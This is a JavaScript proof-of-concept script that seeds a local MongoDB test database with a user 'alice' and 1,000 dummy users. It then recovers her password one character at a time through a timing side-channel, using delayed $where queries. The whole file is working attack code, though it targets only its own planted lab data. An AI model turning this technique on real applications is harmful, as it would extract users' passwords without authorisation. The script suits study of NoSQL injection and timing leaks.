import { MongoClient } from 'mongodb';

const uri = 'mongodb://localhost:27017';
const dbName = 'test';
const client = await MongoClient.connect(uri, { useUnifiedTopology: true });
const db = client.db(dbName);
const users = db.collection('users');

const targetUser = 'alice';
const targetPassword = 'apple123';
const dummyUserCount = 1000;
const charset = 'abcdefghijklmnopqrstuvwxyz0123456789';
const maxPasswordLength = 20;
const delayLoop = true;
const repeat = 5; // Repeat each guess to stabilize results

// Ensure target and dummy users exist
const existing = await users.findOne({ name: targetUser });
if (!existing) {
  await users.insertOne({ name: targetUser, password: targetPassword });
  console.log(`✅ Inserted target user: ${targetUser} / ${targetPassword}`);
}

const dummyExists = await users.findOne({ name: 'dummy0' });
if (!dummyExists) {
  console.log(`🧪 Inserting ${dummyUserCount} dummy users...`);
  const bulk = [];
  for (let i = 0; i < dummyUserCount; i++) {
    bulk.push({ name: `dummy${i}`, password: 'nothing' });
  }
  await users.insertMany(bulk);
  console.log(`✅ Dummy users inserted.`);
}

// Helpers
function toMs(nano) {
  return Number(nano) / 1e6;
}

function getMedian(values) {
  const sorted = [...values].sort((a, b) => a - b);
  return sorted[Math.floor(sorted.length / 2)];
}

function getStdDev(values, mean) {
  const variance = values.reduce((sum, val) => sum + Math.pow(val - mean, 2), 0) / values.length;
  return Math.sqrt(variance);
}

// Brute-force password
let guessedPassword = '';

console.log(`\n🔓 Starting brute-force timing attack (stable mode)...\n`);

for (let position = 0; position < maxPasswordLength; position++) {
  let bestChar = null;
  let bestScore = -Infinity;

  const candidates = [];

  for (const char of charset) {
    const whereBody = `
      function() {
        ${delayLoop ? 'for (let i = 0; i < 500000; i++) {}' : ''}
        return this.name === '${targetUser}' && this.password.charAt(${position}) === '${char}';
      }
    `;

    const durations = [];

    for (let i = 0; i < repeat; i++) {
      const start = process.hrtime.bigint();
      await users.findOne({ $where: whereBody });
      const end = process.hrtime.bigint();
      durations.push(toMs(end - start));
    }

    const median = getMedian(durations);
    const avg = durations.reduce((a, b) => a + b, 0) / durations.length;
    const stdDev = getStdDev(durations, avg);
    const score = median - stdDev;

    candidates.push({ char, median, stdDev, score });

    console.log(`char '${char}' → median: ${median.toFixed(2)}ms ± ${stdDev.toFixed(2)}ms`);
  }

  // Sort by best score (median - stdDev)
  candidates.sort((a, b) => b.score - a.score);
  const best = candidates[0];

  if (!best || best.median < 5) {
    console.log(`🛑 No reliable timing signal at position ${position + 1}, stopping.`);
    break;
  }

  guessedPassword += best.char;
  console.log(`✅ Guessed char ${position + 1}: '${best.char}' → current: '${guessedPassword}'\n`);
}

console.log(`\n✔️ Final guessed password: ${guessedPassword}`);
await client.close();
